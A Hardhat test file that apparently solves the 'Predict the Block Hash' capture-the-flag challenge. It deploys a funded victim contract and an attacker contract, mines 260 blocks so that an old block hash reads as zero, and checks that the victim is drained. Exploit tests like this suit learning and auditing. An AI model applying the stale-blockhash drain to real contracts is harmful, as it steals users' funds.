const { ethers } = require("hardhat");
const { expect } = require("chai");

const BigNumber = ethers.BigNumber;


describe("PredictTheBlockHashChallenge", function () {
    let contract;
    let owner;
    let attacker;
    let victimContract;


    this.beforeEach(async function () {
        [owner, attacker] = await ethers.getSigners();
        const PredictTheBlockHashChallengeContract = await ethers.getContractFactory("PredictTheBlockHashChallenge");
        const PredictTheBlockHashChallengeAttacker = await ethers.getContractFactory("PredictTheBlockHashAttacker");
        victimContract = await PredictTheBlockHashChallengeContract.deploy({value: ethers.utils.parseEther("1")});
        await victimContract.deployed();
        contract = await PredictTheBlockHashChallengeAttacker.deploy(victimContract.address);
        await contract.deployed();
    });

    describe("attacker", function () {
        it("Exploit PredictTheBlockHashChallenge", async function () {
            let balance = await ethers.provider.getBalance(attacker.address);
            let balanceVictim = await ethers.provider.getBalance(victimContract.address);
            await contract.connect(attacker).attackStep1({value: ethers.utils.parseEther("1")});
            for(i=0; i < 260; i++) {
                await network.provider.send("evm_increaseTime", [3600])
                await network.provider.send("evm_mine")
            }
            await contract.connect(attacker).attackStep2();
            expect(await ethers.provider.getBalance(attacker.address)).to.be.greaterThan(balance);
            expect(await ethers.provider.getBalance(victimContract.address)).to.be.equal(BigNumber.from("0"));
        });
    });
});
